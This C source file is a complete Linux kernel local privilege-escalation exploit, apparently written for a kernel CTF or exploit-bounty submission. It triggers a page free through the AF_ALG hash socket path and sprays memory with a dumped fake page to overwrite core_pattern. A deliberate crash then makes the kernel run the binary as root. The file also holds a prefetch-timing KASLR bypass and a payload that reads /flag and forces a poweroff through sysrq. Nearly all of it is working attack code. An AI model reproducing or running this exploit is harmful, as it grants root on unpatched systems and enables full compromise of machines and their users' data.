#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if_alg.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/resource.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef SYS_pidfd_getfd
#define SYS_pidfd_getfd 438
#endif

#ifndef SYS_pidfd_open
#define SYS_pidfd_open 434
#endif

#define PAUSE                                                                  \
  {                                                                            \
    int x;                                                                     \
    printf(":");                                                               \
    read(0, &x, 1);                                                            \
  }

#define SYSCHK(x)                                                              \
  ({                                                                           \
    typeof(x) __res = (x);                                                     \
    if (__res == (typeof(x))-1)                                                \
      err(1, "SYSCHK(" #x ")");                                                \
    __res;                                                                     \
  })

/*
 * This buffer holds a fake memory payload composed of a complete `core_pattern`
 * page layout. It is used for overwriting the `core_pattern` file path when the
 * arbitrary free primitive is triggered. This exact memory layout was extracted
 * dynamically using GDB to dump the whole physical page.
 */
unsigned long long fake_buf[512] = {
    0x0000000000000010, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0xffffffff83db2fa0, 0xffffffff83db30a0,
    0xffffffff83f270e0, 0xffffffff83f48360, 0xffffffff83daad00,
    0xffffffff83dcada0, 0x0000000000000441, 0xffffffff83db2cc0,
    0xffffffff83db1ee0, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000010, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0xffffffff83db3020,
    0xffffffff83db3120, 0xffffffff83f27140, 0xffffffff83f483c0,
    0xffffffff83daad80, 0xffffffff83dcae20, 0x0000000000000442,
    0xffffffff83db2ce0, 0xffffffff83db21a0, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000010,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0xffffffff83db30a0, 0xffffffff83db31a0, 0xffffffff83f27140,
    0xffffffff83f48420, 0xffffffff83daae00, 0xffffffff83dcaea0,
    0x0000000000000443, 0xffffffff83db2ce0, 0xffffffff83db21a0,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000010, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0xffffffff83db3120, 0xffffffff83db3220,
    0xffffffff83f27140, 0xffffffff83f48480, 0xffffffff83daae80,
    0xffffffff83dcaf20, 0x0000000000000444, 0xffffffff83db2ce0,
    0xffffffff83db21a0, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000010, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0xffffffff83db31a0,
    0xffffffff83db32a0, 0xffffffff83f27140, 0xffffffff83f484e0,
    0xffffffff83daaf00, 0xffffffff83dcafa0, 0x0000000000000445,
    0xffffffff83db2ce0, 0xffffffff83db21a0, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000010,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0xffffffff83db3220, 0xffffffff83db3860, 0xffffffff83f271a0,
    0xffffffff83f48540, 0xffffffff83daaf80, 0xffffffff83dcb020,
    0x0000000000000446, 0xffffffff83db2d00, 0xffffffff83db2460,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000010, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0xffffffff8151ab90, 0xffffffff833b41f9,
    0xffffffff8151ab30, 0xffffffff833b4201, 0xffffffff8151aad0,
    0xffffffff833b4209, 0xffffffff8151aa70, 0xffffffff833b4211,
    0xffffffff8151aa10, 0xffffffff833b4221, 0xffffffff8151a9b0,
    0xffffffff833b4229, 0xffffffff8151a930, 0xffffffff833b4231,
    0xffffffff8151a8d0, 0xffffffff833b4239, 0xffffffff8151a870,
    0xffffffff833b4241, 0xffffffff8151a810, 0xffffffff833b4249,
    0xffffffff8151a790, 0xffffffff833b4251, 0xffffffff8151a710,
    0xffffffff833b4259, 0xffffffff83db3480, 0xffffffff83da2a90,
    0x0000000000000000, 0xffffffff81521ba0, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0xffffffff83254e05, 0x0000000000000000, 0xffffffff81520eb0,
    0x0000000000000000, 0x0000000000000000, 0xffffffff814ae4f0,
    0x0000000000000000, 0xffffffff83db6460, 0x0000000000000000,
    0x0000000000000001, 0xffffffff83db3470, 0xffffffff83db3470,
    0xffffffff83db34c0, 0xffffffff83db33e0, 0x0000000000000000,
    0xffffffff81521e40, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0xffffffff83db3500,
    0xffffffff83db3480, 0x0000000000000000, 0xffffffff815237c0,
    0xffffffff81522390, 0xffffffff815225f0, 0x0000000000001000,
    0x0000000000000000, 0xffffffff83da2a90, 0xffffffff83db34c0,
    0x0000000000000000, 0xffffffff815266a0, 0xffffffff81525210,
    0xffffffff81525470, 0x0000000000001000, 0x0000000000000000,
    0xffffffff83dcf740, 0xffffffff83f1bc40, 0xffffffff8152b540,
    0x0000000000000000, 0xffffffff8152b6c0, 0x0000000000000000,
    0xffffffff84b380a4, 0x0000000000000010, 0x0000138800000000,
    0x000000000000000a, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000138800000000, 0x000000000000000a,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0xffffffff83257ccf, 0xffffffff84b390c8, 0x000001a400000004,
    0x0000000000000000, 0xffffffff811d1260, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0xffffffff83257cdd,
    0xffffffff83db3720, 0x000001a400000080, 0x0000000000000000,
    0xffffffff8152bdb0, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0xffffffff83257cea, 0xffffffff84b390c4,
    0x000001a400000004, 0x0000000000000000, 0xffffffff811d1260,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000080,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0x0000000065726f63, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0xffffffff8323f57a, 0xffffffff83c7197c,
    0x000001a400000004, 0x0000000000000000, 0xffffffff811d12a0,
    0x0000000000000000, 0xffffffff8282f0e0, 0xffffffff8282f108,
    0xffffffff8323f586, 0xffffffff83c71978, 0x000001a400000004,
    0x0000000000000000, 0xffffffff811d12a0, 0x0000000000000000,
    0xffffffff8282f0e0, 0xffffffff8282f108, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0xffffffff83db32a0, 0xffffffff83db38e0,
    0xffffffff83f23ee0, 0xffffffff83257d28, 0xffffffff83dab000,
    0xffffffff83dcb0a0, 0x0000000000000447, 0xffffffff83d792e0,
    0xffffffff8324776b, 0x0000000000000000, 0x0000000000000000,
    0xffffffff83db3960, 0x0000000000000002, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0xffffffff83db3860,
    0xffffffff83db39e0, 0xffffffff83f23f40, 0xffffffff83257d43,
    0xffffffff83dab080, 0xffffffff83dcb120, 0x0000000000000448,
    0xffffffff83d79300, 0xffff88810019a300, 0x0000000000000000,
    0x0000000000000000, 0xffffffff83db3960, 0x0000000000000002,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0xffffffff83257d5f, 0x0000000300000130, 0xffffffff83db39c0,
    0xffffffff83db39a0, 0xffff888100306e70, 0xffff888100306ce8,
    0xffffffff83db38e0, 0xffffffff83db3860, 0xffffffff83257d75,
    0xffffffff83291c2f, 0xffffffff8326df49, 0x0000000000000000,
    0xffffffff832378e0, 0xffffffff83257d80, 0xffffffff832378e0,
    0x0000000000000000, 0xffffffff83db38e0, 0xffffffff83db3a60,
    0xffffffff83f23ee0, 0xffffffff83257d95, 0xffffffff83dab100,
    0xffffffff83dcb1a0, 0x0000000000000449, 0xffffffff83d792e0,
    0xffffffff8324776b, 0x0000000000000000, 0x0000000000000000,
    0xffffffff83db3ae0, 0x0000000000000002, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000, 0xffffffff83db39e0,
    0xffffffff83db4fe0, 0xffffffff83f23f40, 0xffffffff83257db0,
    0xffffffff83dab180, 0xffffffff83dcb220, 0x000000000000044a,
    0xffffffff83d79300, 0xffff888100196e00, 0x0000000000000000,
    0x0000000000000000, 0xffffffff83db3ae0, 0x0000000000000002,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0xffffffff83257dcc, 0x000000050000012f, 0xffffffff83db3b60,
    0xffffffff83db3b20, 0xffff8881003060e0, 0xffff8881003063b8,
    0xffffffff83db3a60, 0xffffffff83db39e0, 0xffffffff83255d1d,
    0xffffffff8325b69b, 0xffffffff83291c2f, 0xffffffff83257de2,
    0xffffffff8325a981, 0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0xffffffff832378e0, 0xffffffff8323aa9f,
    0xffffffff83257d80, 0xffffffff8326fea3, 0xffffffff832378e0,
    0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
    0x3a64252076656422, 0x30206f6e69206425, 0x7a697320786c2578,
    0x786c6c2578302065, 0x2074657366666f20, 0x6620786c6c257830,
    0x207325207367616c, 0x65206425206f6961, 0x20642520726f7272,
    0x22647a2520746572, 0x69736e752828202c, 0x746e692064656e67,
    0x2d43455228282029, 0x3e3e20297665643e, 0x28202c2929303220,
    0x656e6769736e7528, 0x282029746e692064, 0x65643e2d43455228,
    0x3128282026202976, 0x293032203c3c2055, 0x2c29292931202d20,
    0x6e693e2d43455220, 0x3e2d434552202c6f, 0x52202c657a697369,
    0x2c736f703e2d4345, 0x746e6972705f5f20, 0x52287367616c665f,
    0x665f696b3e2d4345, 0x7c22202c7367616c, 0x692028207b202c22,
    0x5f2028282029746e, 0x5f6c656e72656b5f, 0x783029745f667772,
    0x3130303030303030, 0x5250494822202c29, 0x207b202c7d202249,
    0x282029746e692028, 0x6e72656b5f5f2028, 0x745f6677725f6c65,
    0x3030303030783029, 0x4422202c29323030, 0x2c7d2022434e5953,
    0x746e692028207b20, 0x6b5f5f2028282029, 0x77725f6c656e7265,
    0x3030783029745f66, 0x2c29343030303030, 0x2022434e59532220,
    0x692028207b202c7d, 0x5f2028282029746e, 0x5f6c656e72656b5f,
    0x783029745f667772, 0x3830303030303030, 0x41574f4e22202c29,
    0x7b202c7d20225449, 0x2029746e69202820, 0x72656b5f5f202828,
    0x5f6677725f6c656e, 0x3030303078302974, 0x22202c2930313030,
    0x2022444e45505041, 0x203128207b202c7d, 0x202c293631203c3c,
    0x4446544e45564522, 0x3128207b202c7d22, 0x2c293731203c3c20,
    0x5443455249442220, 0x28207b202c7d2022, 0x293831203c3c2031,
    0x455449525722202c, 0x28207b202c7d2022, 0x293931203c3c2031,
    0x515449415722202c, 0x28207b202c7d2022, 0x293032203c3c2031,
    0x224f494f4e22202c, 0x3128207b202c7d20, 0x2c293132203c3c20,
    0x5f434f4c4c412220, 0x7d20224548434143, 0x3c203128207b202c,
    0x22202c293232203c, 0x435f52454c4c4143, 0x2c297d2022504d4f,
    0x69613e2d43455220, 0x3e2d434552202c6f, 0x52202c726f727265,
    0x007465723e2d4345, 0x3a64252076656422, 0x30206f6e69206425,
    0x7a697320786c2578, 0x786c6c2578302065, 0x2074657366666f20,
    0x6c20786c6c257830, 0x7830206874676e65, 0x656e6f6420787a25,
    0x2065726f6665625f, 0x6c6620787a257830, 0x6420732520736761,
    0x7367616c665f6f69, 0x206f696120732520, 0x752828202c226425,
    0x2064656e6769736e, 0x5228282029746e69, 0x297665643e2d4345,
    0x29293032203e3e20, 0x69736e752828202c, 0x746e692064656e67,
    0x2d43455228282029, 0x202620297665643e, 0x203c3c2055312828,
    0x2931202d20293032, 0x2d434552202c2929, 0x4552202c6f6e693e,
    0x657a6973693e2d43, 0x703e2d434552202c, 0x2d434552202c736f,
    0x202c746e756f633e, 0x6e6f643e2d434552, 0x65726f6665625f65,
    0x6e6972705f5f202c, 0x287367616c665f74, 0x5f696b3e2d434552,
    0x22202c7367616c66, 0x2028207b202c227c, 0x2028282029746e69,
    0x6c656e72656b5f5f, 0x3029745f6677725f, 0x3030303030303078,
    0x50494822202c2931, 0x7b202c7d20224952, 0x2029746e69202820,
    0x72656b5f5f202828, 0x5f6677725f6c656e, 0x3030303078302974,
    0x22202c2932303030, 0x7d2022434e595344, 0x6e692028207b202c,
    0x5f5f202828202974, 0x725f6c656e72656b,
};

#define THREAD_NUM 0x80
#define PIPE_COUNT 0x100
#define CORE_PATTERN_OFFSET 0x2db3720
#define CORE_PATTERN_PAYLOAD_OFFSET 0x720

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

char af_alg_sgl[0x400];
int sync_pipe[2];
int spray_sockpairs[THREAD_NUM][2];
pthread_t spray_threads[THREAD_NUM];

void setup_cpu_affinity(int i) {
  cpu_set_t mask;
  CPU_ZERO(&mask);
  CPU_SET(i, &mask);
  sched_setaffinity(0, sizeof(mask), &mask);
}

void *spray_job(void *x) {
  char local_buf[0x1000];
  size_t idx = (size_t)x;
  write(sync_pipe[0], local_buf, 1);
  read(sync_pipe[0], local_buf, 1);
  struct iovec iov = {local_buf, 0x1000};

  struct msghdr mhdr = {.msg_iov = &iov,
                        .msg_iovlen = 1,
                        .msg_control = af_alg_sgl,
                        .msg_controllen = 0x400};
  while (1) {
    sendmsg(spray_sockpairs[idx][1], &mhdr, 0);
    write(sync_pipe[0], local_buf, 1);
    read(sync_pipe[0], local_buf, 1);
  }
}
size_t ktext;

void do_spray() {

  char local_buf[0x1000];

  *(size_t *)&af_alg_sgl[0] = ktext + CORE_PATTERN_OFFSET;

  for (int i = 0; i < THREAD_NUM; i++) {
    SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, spray_sockpairs[i]));
    int n = 0x800;
    setsockopt(spray_sockpairs[i][1], SOL_SOCKET, SO_SNDBUF, (char *)&n,
               sizeof(n));
    setsockopt(spray_sockpairs[i][0], SOL_SOCKET, SO_RCVBUF, (char *)&n,
               sizeof(n));
    write(spray_sockpairs[i][1], local_buf, 0x1000);
  }

  for (int i = 0; i < THREAD_NUM; i++)
    pthread_create(&spray_threads[i], 0, spray_job, (void *)(size_t)i);

  for (int i = 0; i < THREAD_NUM; i++)
    read(sync_pipe[1], local_buf, 1);
}

int util_check_core() {
  // Check if /proc/sys/kernel/core_pattern has been overwritten
  char buf[0x100] = {}; // shadowing is acceptable as this is local explicitly
  int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
  read(core, buf, sizeof(buf));
  close(core);
  return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}

void vuln_trigger_core_pattern(void) {
  int memfd = memfd_create("", 0);
  // send our binary to memfd for core_pattern payload
  SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
  // our binary now at file descriptor 666
  dup2(memfd, 666);
  close(memfd);
  while (util_check_core() == 0) {
    // @sleep(desc="wait for core_pattern to be overwritten")
    sleep(1);
  }
  puts("Root shell !!");
  /* Trigger program crash and cause kernel to executes program from
   * core_pattern which is our "root" binary */
  *(size_t *)0 = 0;
}
size_t bypass_kaslr(u64 base);
int main(int argc, char **argv) {

  struct rlimit rlim = {.rlim_cur = 0xf000, .rlim_max = 0xf000};
  setrlimit(RLIMIT_NOFILE, &rlim);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  struct sockaddr_alg sa = {
      .salg_family = AF_ALG,
      .salg_type = "hash", // symmetric key cipher
      .salg_name = "md5",  // AES in CBC mode
  };

  if (argc > 1) {
#define SYS_pidfd_getfd 438
    int pid = strtoull(argv[1], 0, 10);
    int pfd = syscall(SYS_pidfd_open, pid, 0);
    int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
    int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
    int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
    dup2(stdinfd, 0);
    dup2(stdoutfd, 1);
    dup2(stderrfd, 2);
    /* Get flag and poweroff immediately to boost next round try in PR
     * verification workflow*/
    system("cat /flag");
    system("cat /flag");
    system("cat /flag");
    system("cat /flag");
    system("cat /flag");
    system("cat /flag");

    system("cat /flag;echo o>/proc/sysrq-trigger");
    execlp("bash", "bash", NULL);
  }
  if (fork() == 0) // this process is used to trigger core_pattern exploit
  {
    setup_cpu_affinity(1);
    setsid();
    vuln_trigger_core_pattern();
  }
  if (getenv("KTEXT") == NULL) {
    ktext = bypass_kaslr(0);
  } else {
    ktext = strtoull(getenv("KTEXT"), 0, 16);
  }
  printf("got ktext %zx\n", ktext);

  for (int i = 0; i < 512; i++)
    if (fake_buf[i] > 0xffffffff81000000ULL)
      fake_buf[i] = fake_buf[i] - 0xffffffff81000000ULL + ktext;

  setup_cpu_affinity(0);

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, sync_pipe));
  do_spray();

  // Create transformation socket
  int alg_tfm_fd = SYSCHK(socket(AF_ALG, SOCK_SEQPACKET, 0));

  // Bind to algorithm
  SYSCHK(bind(alg_tfm_fd, (struct sockaddr *)&sa, sizeof(sa)));

  // Accept operation socket
  char sync_buf[1];
  int alg_op_fd = SYSCHK(accept(alg_tfm_fd, NULL, 0));
  SYSCHK(send(alg_op_fd, sync_buf, 1, MSG_MORE));

  // start spray to control uninit page
  for (int i = 0; i < THREAD_NUM; i++) {
    write(sync_pipe[1], sync_buf, 1);
    read(sync_pipe[1], sync_buf, 1);
  }

  int vuln_op_fd = SYSCHK(accept(alg_op_fd, NULL, 0));
  struct iovec iov = {.iov_base = sync_buf, .iov_len = 0};

  char padding_buf[0x5000];
  struct msghdr msg = {
      .msg_iovlen = 1,
      .msg_iov = &iov,
      .msg_control = padding_buf,
      .msg_controllen = 0x4cdf, // in order to make hash_alloc_result fail, we
                                // need increase sk->sk_omem_alloc

  };

  sendmsg(vuln_op_fd, &msg, 0); // triger kernel to free core_pattern's page

again:
  char *anon = SYSCHK(mmap(NULL, 0x1000000, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANON, -1, 0));
  for (int i = 0; i < 0x1000000; i += 0x1000) {
    memcpy(anon + i, fake_buf, 0x1000);
    strcpy(anon + i + CORE_PATTERN_PAYLOAD_OFFSET, "|/proc/%P/fd/666 %P");
  }

  // @sleep(desc="Wait to check if the core_pattern was successfully
  // overwritten, if yes, proceed holding.")
  if (util_check_core())
    PAUSE;
  puts("mmap again");
  goto again;
  return 0;
}

inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
  uint64_t a, d;
  asm volatile("mfence\n\t"
               "RDTSCP\n\t"
               "mov %%rdx, %0\n\t"
               "mov %%rax, %1\n\t"
               "xor %%rax, %%rax\n\t"
               "lfence\n\t"
               : "=r"(d), "=r"(a)
               :
               : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d << 32) | a;
  return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
  uint64_t a, d;
  asm volatile("xor %%rax, %%rax\n\t"
               "lfence\n\t"
               "RDTSCP\n\t"
               "mov %%rdx, %0\n\t"
               "mov %%rax, %1\n\t"
               "mfence\n\t"
               : "=r"(d), "=r"(a)
               :
               : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d << 32) | a;
  return a;
}

void prefetch(void *p) {
  asm volatile("prefetchnta (%0)\n"
               "prefetcht2 (%0)\n"
               :
               : "r"(p));
}

size_t flushandreload(void *addr) // row miss
{
  size_t time = rdtsc_begin();
  prefetch(addr);
  size_t delta = rdtsc_end() - time;
  return delta;
}

// #define KASLR_BYPASS_INTEL
size_t bypass_kaslr(u64 base) {
  if (!base) {
#ifdef KASLR_BYPASS_INTEL
#define OFFSET 0
#define START (0xffffffff81000000ull + OFFSET)
#define END (0xffffffffD0000000ull + OFFSET)
#define STEP 0x0000000001000000ull
    while (1) {
      u64 bases[7] = {0};
      for (int vote = 0; vote < ARRAY_LEN(bases); vote++) {
        size_t times[(END - START) / STEP] = {};
        uint64_t addrs[(END - START) / STEP];

        for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
          times[ti] = ~0;
          addrs[ti] = START + STEP * (u64)ti;
        }

        for (int i = 0; i < 16; i++) {
          for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
            u64 addr = addrs[ti];
            size_t t = flushandreload((void *)addr);
            if (t < times[ti]) {
              times[ti] = t;
            }
          }
        }

        size_t minv = ~0;
        size_t mini = -1;
        for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++) {
          if (times[ti] < minv) {
            mini = ti;
            minv = times[ti];
          }
        }

        if (mini < 0) {
          return -1;
        }

        bases[vote] = addrs[mini];
      }

      int c = 0;
      for (int i = 0; i < ARRAY_LEN(bases); i++) {
        if (c == 0) {
          base = bases[i];
        } else if (base == bases[i]) {
          c++;
        } else {
          c--;
        }
      }

      c = 0;
      for (int i = 0; i < ARRAY_LEN(bases); i++) {
        if (base == bases[i]) {
          c++;
        }
      }
      if (c > ARRAY_LEN(bases) / 2) {
        base -= OFFSET;
        goto got_base;
      }

      printf("majority vote failed:\n");
      printf("base = %llx with %d votes\n", base, c);
    }
#else
#define START (0xffffffff81000000ull)
#define END (0xffffffffc0000000ull)
#define STEP 0x0000000000200000ull
#define NUM_TRIALS 9
    // largest contiguous mapped area at the beginning of _stext
#define WINDOW_SIZE 11

    while (1) {
      u64 bases[NUM_TRIALS] = {0};

      for (int vote = 0; vote < ARRAY_LEN(bases); vote++) {
        size_t times[(END - START) / STEP] = {};
        uint64_t addrs[(END - START) / STEP];

        for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
          times[ti] = ~0;
          addrs[ti] = START + STEP * (u64)ti;
        }

        for (int i = 0; i < 16; i++) {
          for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
            u64 addr = addrs[ti];
            size_t t = flushandreload((void *)addr);
            if (t < times[ti]) {
              times[ti] = t;
            }
          }
        }

        uint64_t max = 0;
        int max_i = 0;
        for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++) {
          uint64_t sum = 0;
          for (int i = 0; i < WINDOW_SIZE; i++) {
            sum += times[ti + i];
          }
          if (sum > max) {
            max = sum;
            max_i = ti;
          }
        }

        bases[vote] = addrs[max_i];
      }

      int c = 0;
      for (int i = 0; i < ARRAY_LEN(bases); i++) {
        if (c == 0) {
          base = bases[i];
        } else if (base == bases[i]) {
          c++;
        } else {
          c--;
        }
      }

      c = 0;
      for (int i = 0; i < ARRAY_LEN(bases); i++) {
        if (base == bases[i]) {
          c++;
        }
      }
      if (c > ARRAY_LEN(bases) / 2) {
        goto got_base;
      }

      printf("majority vote failed:\n");
      printf("base = %llx with %d votes\n", base, c);
    }
#endif
  }

got_base:

  printf("using kernel base %llx\n", base);

  return base;
}
